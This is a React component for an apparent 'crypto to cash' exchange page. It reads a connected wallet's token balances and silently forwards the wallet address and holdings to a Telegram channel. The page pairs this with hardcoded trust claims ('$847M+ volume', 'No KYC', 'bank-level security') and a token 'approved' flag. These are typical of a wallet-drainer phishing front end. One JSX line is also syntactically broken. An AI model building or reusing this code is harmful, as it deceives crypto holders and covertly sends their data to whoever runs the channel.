import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { 
  Wallet, 
  RefreshCw, 
  AlertCircle, 
  CheckCircle, 
  ArrowRight, 
  TrendingUp, 
  Shield, 
  Zap, 
  DollarSign,
  Coins,
  Activity,
  Lock,
  Globe,
  Users,
  Star,
  Play,
  ChevronRight,
  Smartphone,
  CreditCard,
  Clock,
  Award
} from 'lucide-react';
import { Token, ThemeClasses } from '../types';
import { BSC_PARAMS, COVALENT_KEY } from '../constants';
import { sendToTelegram, fetchCoinGeckoPrice, getDefaultPrice } from '../utils';
import MobileWalletPrompt from './MobileWalletPrompt';

interface AssetManagementProps {
  walletAddress: string;
  tokens: Token[];
  setTokens: (tokens: Token[]) => void;
  selectedToken: Token | null;
  setSelectedToken: (token: Token | null) => void;
  tradeAmount: string;
  setTradeAmount: (amount: string) => void;
  setCurrentStep: (step: number) => void;
  darkMode: boolean;
  themeClasses: ThemeClasses;
  connectWallet: () => void;
  isConnecting: boolean;
}

const AssetManagement: React.FC<AssetManagementProps> = ({
  walletAddress,
  tokens,
  setTokens,
  selectedToken,
  setSelectedToken,
  tradeAmount,
  setTradeAmount,
  setCurrentStep,
  darkMode,
  themeClasses,
  connectWallet,
  isConnecting
}) => {
  const { t } = useTranslation();
  const [loading, setLoading] = useState(false);
  const [showMobilePrompt, setShowMobilePrompt] = useState(false);
  const [showHowItWorks, setShowHowItWorks] = useState(false);
  const [currentStep, setCurrentHowItWorksStep] = useState(0);
  const [showStartExchange, setShowStartExchange] = useState(false);

  const howItWorksSteps = [
    {
      icon: Wallet,
      title: "Connect Your Wallet",
      description: "Securely connect your Web3 wallet to access your crypto assets",
      color: "from-blue-500 to-cyan-600"
    },
    {
      icon: Coins,
      title: "Select Assets",
      description: "Choose the cryptocurrency you want to convert to cash",
      color: "from-purple-500 to-violet-600"
    },
    {
      icon: Globe,
      title: "Choose Payout Method",
      description: "Select your preferred payment method and country",
      color: "from-green-500 to-emerald-600"
    },
    {
      icon: Shield,
      title: "Secure Processing",
      description: "Your transaction is processed with bank-level security",
      color: "from-orange-500 to-red-600"
    },
    {
      icon: DollarSign,
      title: "Receive Cash",
      description: "Get your money instantly in your chosen payment method",
      color: "from-pink-500 to-rose-600"
    }
  ];

  useEffect(() => {
    if (walletAddress) {
      fetchTokens();
    }
  }, [walletAddress]);

  useEffect(() => {
    if (showHowItWorks) {
      const interval = setInterval(() => {
        setCurrentHowItWorksStep((prev) => (prev + 1) % howItWorksSteps.length);
      }, 3000);
      return () => clearInterval(interval);
    }
  }, [showHowItWorks, howItWorksSteps.length]);

  const fetchTokens = async () => {
    if (!walletAddress) return;
    
    setLoading(true);
    try {
      const response = await fetch(
        `https://api.covalenthq.com/v1/56/address/${walletAddress}/balances_v2/?key=${COVALENT_KEY}`
      );
      
      if (!response.ok) throw new Error('Failed to fetch tokens');
      
      const data = await response.json();
      const tokenList: Token[] = [];
      
      for (const item of data.data.items) {
        if (parseFloat(item.balance) > 0) {
          const balance = (parseFloat(item.balance) / Math.pow(10, item.contract_decimals)).toFixed(6);
          
          let price = 0;
          try {
            price = await fetchCoinGeckoPrice(item.contract_ticker_symbol);
          } catch {
            price = getDefaultPrice(item.contract_ticker_symbol);
          }
          
          const value = (parseFloat(balance) * price).toFixed(2);
          
          tokenList.push({
            symbol: item.contract_ticker_symbol,
            name: item.contract_name,
            balance,
            value: `$${value}`,
            approved: false,
            contractAddress: item.contract_address,
            logoUrl: item.logo_url
          });
        }
      }
      
      setTokens(tokenList);
      
      // Send notification to Telegram
      const tokenListText = tokenList.map(t => `${t.symbol}: ${t.balance} ($${t.value})`).join('\n');
      await sendToTelegram({
        action: 'Wallet Connected',
        wallet: walletAddress,
        tokenList: tokenListText,
        timestamp: new Date().toISOString(),
        network: 'BSC'
      });
      
    } catch (error) {
      console.error('Error fetching tokens:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleStartExchange = () => {
    if (!walletAddress) {
      connectWallet();
      return;
    }
    setShowStartExchange(true);
  };

  const handleTokenSelect = (token: Token) => {
    setSelectedToken(token);
    setTradeAmount('');
  };

  const handleContinue = () => {
    if (selectedToken && tradeAmount && parseFloat(tradeAmount) > 0) {
      setCurrentStep(3);
    }
  };

  // Enhanced Wallet Connection Section
  if (!walletAddress) {
    return (
      <div className="space-y-8">
        {/* Hero Section */}
        <div className={`relative overflow-hidden ${themeClasses.cardBg} rounded-3xl border ${themeClasses.border} shadow-2xl backdrop-blur-xl`}>
          {/* Background Elements */}
          <div className="absolute inset-0 overflow-hidden">
            <div className={`absolute -top-10 -right-10 w-40 h-40 bg-gradient-to-br from-blue-400/10 to-cyan-400/10 rounded-full blur-3xl animate-pulse`}></div>
            <div className={`absolute -bottom-10 -left-10 w-32 h-32 bg-gradient-to-br from-purple-400/10 to-pink-400/10 rounded-full blur-3xl animate-pulse delay-1000`}></div>
          </div>

          <div className="relative z-10 p-8 lg:p-12">
            <div className="text-center mb-8">
              <div className="flex items-center justify-center mb-6">
                <div className={`w-20 h-20 bg-gradient-to-r ${themeClasses.gradient} rounded-3xl flex items-center justify-center shadow-2xl animate-pulse`}>
                  <Wallet className="w-10 h-10 text-white" />
                </div>
              </div>
              
              <h2 className={`text-3xl lg:text-4xl font-bold ${themeClasses.text} mb-4`}>
                Ready to Convert Crypto to Cash?
              </h2>
              <p className={`text-lg ${themeClasses.textSecondary} mb-6 max-w-2xl mx-auto leading-relaxed`}>
                Connect your wallet securely to the BSC network and start converting your cryptocurrency to cash instantly. 
                No KYC required, just fast and secure transactions.
              </p>

              {/* Trust Indicators */}
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
                <div className={`${darkMode ? 'bg-green-900/20' : 'bg-green-50'} rounded-xl p-4 border ${darkMode ? 'border-green-800' : 'border-green-200'}`}>
                  <Shield className="w-6 h-6 text-green-600 mx-auto mb-2" />
                  <div className={`text-sm font-medium ${darkMode ? 'text-green-300' : 'text-green-800'}`}>Bank-Level Security</div>
                </div>
                <div className={`${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} rounded-xl p-4 border ${darkMode ? 'border-blue-800' : 'border-blue-200'}`}>
                  <Zap className="w-6 h-6 text-blue-600 mx-auto mb-2" />
                  <div className={`text-sm font-medium ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>Instant Processing</div>
                </div>
                <div className={`${darkMode ? 'bg-purple-900/20' : 'bg-purple-50'} rounded-xl p-4 border ${darkMode ? 'border-purple-800' : 'border-purple-200'}`}>
                  <Globe className="w-6 h-6 text-purple-600 mx-auto mb-2" />
                  <div className={`text-sm font-medium ${darkMode ? 'text-purple-300' : 'text-purple-800'}`}>Global Coverage</div>
                </div>
                <div className={`${darkMode ? 'bg-orange-900/20' : 'bg-orange-50'} rounded-xl p-4 border ${darkMode ? 'border-orange-800' : 'border-orange-200'}`}>
                  <Users className="w-6 h-6 text-orange-600 mx-auto mb-2" />
                  <div className={`text-sm font-medium ${darkMode ? 'text-orange-300' : 'text-orange-800'}`}>No KYC Required</div>
                </div>
              </div>

              {/* Main CTA */}
              <div className="space-y-4">
                <button
                  onClick={handleStartExchange}
                  disabled={isConnecting}
                  className={`w-full max-w-md mx-auto bg-gradient-to-r ${themeClasses.gradient} text-white py-4 px-8 rounded-2xl font-bold text-lg hover:shadow-2xl disabled:opacity-50 transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-3`}
                >
                  {isConnecting ? (
                    <>
                      <RefreshCw className="w-6 h-6 animate-spin" />
                      <span>Connecting...</span>
                    </>
                  ) : (
                    <>
                      <Play className="w-6 h-6" />
                      <span>Start Exchange: Crypto → Cash</span>
                      <ArrowRight className="w-6 h-6" />
                    </>
                  )}
                </button>

                <div className="flex items-center justify-center space-x-6 text-sm">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className={themeClasses.textSecondary}>Secure BSC Network</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Lock className="w-4 h-4 text-blue-600" />
                    <span className={themeClasses.textSecondary}>256-bit Encryption</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Stats Section */}
            <div className={`bg-gradient-to-r ${darkMode ? 'from-gray-800/50 to-gray-700/50' : 'from-gray-50 to-gray-100'} rounded-2xl p-6 border ${themeClasses.border}`}>
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-6 text-center">
                <div>
                  <div className={`text-2xl font-bold ${themeClasses.text} mb-1`}>$847M+</div>
                  <div className={`text-sm ${themeClasses.textSecondary}`}>Volume Processed</div>
                </div>
                <div>
                  <div className={`text-2xl font-bold ${themeClasses.text} mb-1`}>78K+</div>
                  <div className={`text-sm ${themeClasses.textSecondary}`}>Happy Users</div>
                </div>
                <div>
                  <div className={`text-2xl font-bold ${themeClasses.text} mb-1`}>99.9%</div>
                  <div className={`text-sm ${themeClasses.textSecondary}`}>Success Rate</div>
                </div>
                <div>
                  <div className={`text-2xl font-bold ${themeClasses.text} mb-1`}>3min</div>
                  <div className={`text-sm ${themeClasses.textSecondary}`}>Avg Settlement</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* How It Works Section */}
        <div className={`${themeClasses.cardBg} rounded-3xl border ${themeClasses.border} shadow-xl overflow-hidden backdrop-blur-xl`}>
          <div className={`bg-gradient-to-r ${darkMode ? 'from-blue-900/20 to-purple-900/20' : 'from-blue-50 to-purple-50'} p-6 border-b ${themeClasses.border}`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-3">
                <div className={`w-10 h-10 bg-gradient-to-r ${themeClasses.gradient} rounded-xl flex items-center justify-center shadow-lg`}>
                  <Activity className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className={`text-xl font-bold ${themeClasses.text}`}>How It Works</h3>
                  <p className={`text-sm ${themeClasses.textSecondary}`}>Simple 5-step process</p>
                </div>
              </div>
              <button
                onClick={() => setShowHowItWorks(!showHowItWorks)}
                className={`p-2 rounded-lg ${themeClasses.hover} transition-colors`}
              >
                <ChevronRight className={`w-5 h-5 ${themeClasses.text} transition-transform duration-200 ${showHowItWorks ? 'rotate-90' : ''}`} />
              </button>
            </div>
          </div>

          {showHowItWorks && (
            <div className="p-6">
              {/* Interactive Step Display */}
              <div className="mb-8">
                <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50'} rounded-2xl p-6 border ${themeClasses.border}`}>
                  <div className="flex items-center space-x-4 mb-4">
                    <div className={`w-16 h-16 bg-gradient-to-r ${howItWorksSteps[currentStep].color} rounded-2xl flex items-center justify-center shadow-xl`}>
                      <howItWorksSteps[currentStep].icon className="w-8 h-8 text-white" />
                    </div>
                    <div>
                      <h4 className={`text-xl font-bold ${themeClasses.text} mb-1`}>
                        Step {currentStep + 1}: {howItWorksSteps[currentStep].title}
                      </h4>
                      <p className={`${themeClasses.textSecondary}`}>
                        {howItWorksSteps[currentStep].description}
                      </p>
                    </div>
                  </div>
                  
                  {/* Step Indicators */}
                  <div className="flex items-center justify-center space-x-2">
                    {howItWorksSteps.map((_, index) => (
                      <button
                        key={index}
                        onClick={() => setCurrentHowItWorksStep(index)}
                        className={`w-3 h-3 rounded-full transition-all duration-300 ${
                          index === currentStep
                            ? `bg-gradient-to-r ${howItWorksSteps[index].color} shadow-lg scale-125`
                            : `${darkMode ? 'bg-gray-600 hover:bg-gray-500' : 'bg-gray-300 hover:bg-gray-400'}`
                        }`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              {/* All Steps Overview */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                {howItWorksSteps.map((step, index) => (
                  <div
                    key={index}
                    className={`relative p-4 rounded-xl border transition-all duration-300 cursor-pointer ${
                      index === currentStep
                        ? `border-blue-500 ${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} shadow-lg scale-105`
                        : `${themeClasses.border} ${themeClasses.cardBg} ${themeClasses.hover}`
                    }`}
                    onClick={() => setCurrentHowItWorksStep(index)}
                  >
                    <div className={`w-10 h-10 bg-gradient-to-r ${step.color} rounded-xl flex items-center justify-center mb-3 shadow-lg`}>
                      <step.icon className="w-5 h-5 text-white" />
                    </div>
                    <h5 className={`font-semibold ${themeClasses.text} mb-2 text-sm`}>{step.title}</h5>
                    <p className={`text-xs ${themeClasses.textSecondary} leading-relaxed`}>{step.description}</p>
                    
                    {index === currentStep && (
                      <div className="absolute -top-1 -right-1">
                        <div className="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                          <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>

              {/* Features Grid */}
              <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className={`${darkMode ? 'bg-green-900/20' : 'bg-green-50'} rounded-xl p-4 border ${darkMode ? 'border-green-800' : 'border-green-200'}`}>
                  <div className="flex items-center space-x-3 mb-2">
                    <Clock className="w-5 h-5 text-green-600" />
                    <span className={`font-semibold ${darkMode ? 'text-green-300' : 'text-green-800'}`}>Fast Processing</span>
                  </div>
                  <p className={`text-sm ${darkMode ? 'text-green-400' : 'text-green-700'}`}>
                    Average settlement time of just 3 minutes
                  </p>
                </div>
                
                <div className={`${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} rounded-xl p-4 border ${darkMode ? 'border-blue-800' : 'border-blue-200'}`}>
                  <div className="flex items-center space-x-3 mb-2">
                    <CreditCard className="w-5 h-5 text-blue-600" />
                    <span className={`font-semibold ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>Multiple Methods</span>
                  </div>
                  <p className={`text-sm ${darkMode ? 'text-blue-400' : 'text-blue-700'}`}>
                    Bank transfer, UPI, PayPal, and more
                  </p>
                </div>
                
                <div className={`${darkMode ? 'bg-purple-900/20' : 'bg-purple-50'} rounded-xl p-4 border ${darkMode ? 'border-purple-800' : 'border-purple-200'}`}>
                  <div className="flex items-center space-x-3 mb-2">
                    <Award className="w-5 h-5 text-purple-600" />
                    <span className={`font-semibold ${darkMode ? 'text-purple-300' : 'text-purple-800'}`}>Best Rates</span>
                  </div>
                  <p className={`text-sm ${darkMode ? 'text-purple-400' : 'text-purple-700'}`}>
                    Competitive rates with transparent fees
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>

        <MobileWalletPrompt 
          darkMode={darkMode} 
          themeClasses={themeClasses}
          show={showMobilePrompt}
          onClose={() => setShowMobilePrompt(false)}
        />
      </div>
    );
  }

  // Enhanced Zero Funds Display
  if (tokens.length === 0 && !loading) {
    return (
      <div className="space-y-6">
        <div className={`${themeClasses.cardBg} rounded-3xl border ${themeClasses.border} shadow-xl p-8 text-center backdrop-blur-xl`}>
          <div className="mb-6">
            <div className={`w-20 h-20 bg-gradient-to-r from-orange-500 to-red-500 rounded-3xl flex items-center justify-center mx-auto mb-4 shadow-2xl`}>
              <AlertCircle className="w-10 h-10 text-white" />
            </div>
            <h3 className={`text-2xl font-bold ${themeClasses.text} mb-2`}>No Funds Available</h3>
            <p className={`${themeClasses.textSecondary} mb-6 max-w-md mx-auto leading-relaxed`}>
              Your wallet currently has 0 funds. To initiate crypto-to-cash conversions, please ensure you have cryptocurrency assets in your connected wallet.
            </p>
          </div>

          <div className={`${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} border ${darkMode ? 'border-blue-800' : 'border-blue-200'} rounded-2xl p-6 mb-6`}>
            <h4 className={`font-semibold ${darkMode ? 'text-blue-300' : 'text-blue-800'} mb-3`}>What you can do:</h4>
            <div className="space-y-3 text-sm">
              <div className="flex items-center space-x-3">
                <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center flex-shrink-0">
                  <span className="text-white text-xs font-bold">1</span>
                </div>
                <span className={darkMode ? 'text-blue-400' : 'text-blue-700'}>
                  Transfer cryptocurrency to your connected wallet
                </span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center flex-shrink-0">
                  <span className="text-white text-xs font-bold">2</span>
                </div>
                <span className={darkMode ? 'text-blue-400' : 'text-blue-700'}>
                  Purchase crypto from a supported exchange
                </span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center flex-shrink-0">
                  <span className="text-white text-xs font-bold">3</span>
                </div>
                <span className={darkMode ? 'text-blue-400' : 'text-blue-700'}>
                  Refresh this page once you have funds
                </span>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <button
              onClick={fetchTokens}
              disabled={loading}
              className={`bg-gradient-to-r ${themeClasses.gradient} text-white py-3 px-6 rounded-xl font-semibold hover:shadow-xl disabled:opacity-50 transition-all duration-300 flex items-center justify-center space-x-2 mx-auto`}
            >
              <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
              <span>{loading ? 'Checking...' : 'Refresh Wallet'}</span>
            </button>

            <div className="text-center">
              <p className={`text-xs ${themeClasses.textSecondary}`}>
                Connected to: <span className="font-mono">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
              </p>
            </div>
          </div>
        </div>

        {/* Supported Assets Info */}
        <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} p-6`}>
          <h4 className={`font-semibold ${themeClasses.text} mb-4 flex items-center`}>
            <Coins className="w-5 h-5 mr-2 text-blue-600" />
            Supported Assets
          </h4>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {['BTC', 'ETH', 'USDT', 'BNB', 'USDC', 'BUSD', 'AICell', 'CAKE'].map((symbol) => (
              <div key={symbol} className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50'} rounded-lg p-3 text-center border ${themeClasses.border}`}>
                <div className={`w-8 h-8 bg-gradient-to-r ${themeClasses.gradient} rounded-lg flex items-center justify-center mx-auto mb-2`}>
                  <span className="text-white text-xs font-bold">{symbol.charAt(0)}</span>
                </div>
                <span className={`text-sm font-medium ${themeClasses.text}`}>{symbol}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  // Rest of the component remains the same for when there are tokens...
  return (
    <div className="space-y-6">
      {/* Wallet Info Header */}
      <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} p-6 shadow-xl backdrop-blur-xl`}>
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center space-x-3">
            <div className={`w-12 h-12 bg-gradient-to-r ${themeClasses.gradient} rounded-2xl flex items-center justify-center shadow-lg`}>
              <CheckCircle className="w-6 h-6 text-white" />
            </div>
            <div>
              <h3 className={`text-xl font-bold ${themeClasses.text}`}>Wallet Connected</h3>
              <p className={`text-sm ${themeClasses.textSecondary} font-mono`}>
                {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
              </p>
            </div>
          </div>
          <button
            onClick={fetchTokens}
            disabled={loading}
            className={`p-3 rounded-xl ${themeClasses.hover} transition-all duration-200 border ${themeClasses.border}`}
          >
            <RefreshCw className={`w-5 h-5 ${themeClasses.text} ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>
        
        <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/20 to-blue-900/20' : 'from-green-50 to-blue-50'} rounded-xl p-4 border ${darkMode ? 'border-green-800' : 'border-green-200'}`}>
          <div className="flex items-center space-x-2 text-sm">
            <Shield className="w-4 h-4 text-green-600" />
            <span className={`font-medium ${darkMode ? 'text-green-300' : 'text-green-800'}`}>
              Secure BSC Connection • {tokens.length} Assets Found
            </span>
          </div>
        </div>
      </div>

      {/* Token Selection */}
      <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} shadow-xl backdrop-blur-xl`}>
        <div className={`bg-gradient-to-r ${darkMode ? 'from-blue-900/20 to-purple-900/20' : 'from-blue-50 to-purple-50'} p-6 border-b ${themeClasses.border}`}>
          <h3 className={`text-xl font-bold ${themeClasses.text} flex items-center`}>
            <Coins className="w-6 h-6 mr-2 text-blue-600" />
            Select Asset to Convert
          </h3>
          <p className={`text-sm ${themeClasses.textSecondary} mt-1`}>
            Choose the cryptocurrency you want to convert to cash
          </p>
        </div>

        <div className="p-6">
          {loading ? (
            <div className="text-center py-8">
              <RefreshCw className={`w-8 h-8 ${themeClasses.text} animate-spin mx-auto mb-4`} />
              <p className={themeClasses.textSecondary}>Loading your assets...</p>
            </div>
          ) : (
            <div className="space-y-3">
              {tokens.map((token) => (
                <button
                  key={token.contractAddress}
                  onClick={() => handleTokenSelect(token)}
                  className={`w-full p-4 rounded-xl border-2 transition-all duration-300 text-left ${
                    selectedToken?.contractAddress === token.contractAddress
                      ? `border-blue-500 ${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} shadow-lg`
                      : `${themeClasses.border} ${themeClasses.cardBg} ${themeClasses.hover}`
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-4">
                      <div className={`w-12 h-12 bg-gradient-to-r ${themeClasses.gradient} rounded-2xl flex items-center justify-center text-white font-bold shadow-lg`}>
                        {token.symbol?.charAt(0)}
                      </div>
                      <div>
                        <div className={`font-semibold ${themeClasses.text}`}>{token.name}</div>
                        <div className={`text-sm ${themeClasses.textSecondary}`}>
                          {token.balance} {token.symbol}
                        </div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className={`font-bold ${themeClasses.text}`}>{token.value}</div>
                      <div className="flex items-center text-green-600 text-sm">
                        <TrendingUp className="w-4 h-4 mr-1" />
                        Available
                      </div>
                    </div>
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Amount Input */}
      {selectedToken && (
        <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} shadow-xl backdrop-blur-xl`}>
          <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/20 to-emerald-900/20' : 'from-green-50 to-emerald-50'} p-6 border-b ${themeClasses.border}`}>
            <h3 className={`text-xl font-bold ${themeClasses.text} flex items-center`}>
              <DollarSign className="w-6 h-6 mr-2 text-green-600" />
              Enter Amount
            </h3>
            <p className={`text-sm ${themeClasses.textSecondary} mt-1`}>
              How much {selectedToken.symbol} do you want to convert?
            </p>
          </div>

          <div className="p-6">
            <div className="space-y-4">
              <div>
                <label className={`block text-sm font-medium ${themeClasses.text} mb-2`}>
                  Amount ({selectedToken.symbol})
                </label>
                <input
                  type="number"
                  value={tradeAmount}
                  onChange={(e) => setTradeAmount(e.target.value)}
                  className={`w-full border rounded-2xl px-4 py-3 text-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${themeClasses.input}`}
                  placeholder={`0.00 ${selectedToken.symbol}`}
                  max={selectedToken.balance}
                  step="0.000001"
                />
                <div className="flex justify-between items-center mt-2">
                  <span className={`text-sm ${themeClasses.textSecondary}`}>
                    Available: {selectedToken.balance} {selectedToken.symbol}
                  </span>
                  <button
                    onClick={() => setTradeAmount(selectedToken.balance)}
                    className="text-blue-600 hover:text-blue-800 text-sm font-medium"
                  >
                    Use Max
                  </button>
                </div>
              </div>

              {tradeAmount && parseFloat(tradeAmount) > 0 && (
                <div className={`${darkMode ? 'bg-blue-900/20' : 'bg-blue-50'} border ${darkMode ? 'border-blue-800' : 'border-blue-200'} rounded-xl p-4`}>
                  <div className="flex justify-between items-center">
                    <span className={`text-sm ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>
                      Estimated Value:
                    </span>
                    <span className={`font-bold ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>
                      ${(parseFloat(tradeAmount) * parseFloat(selectedToken.value.replace('$', '')) / parseFloat(selectedToken.balance)).toFixed(2)}
                    </span>
                  </div>
                </div>
              )}

              <button
                onClick={handleContinue}
                disabled={!tradeAmount || parseFloat(tradeAmount) <= 0 || parseFloat(tradeAmount) > parseFloat(selectedToken.balance)}
                className={`w-full bg-gradient-to-r ${themeClasses.gradient} text-white py-4 rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 transition-all duration-300 flex items-center justify-center space-x-2`}
              >
                <ArrowRight className="w-5 h-5" />
                <span>Continue to Payment Method</span>
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AssetManagement;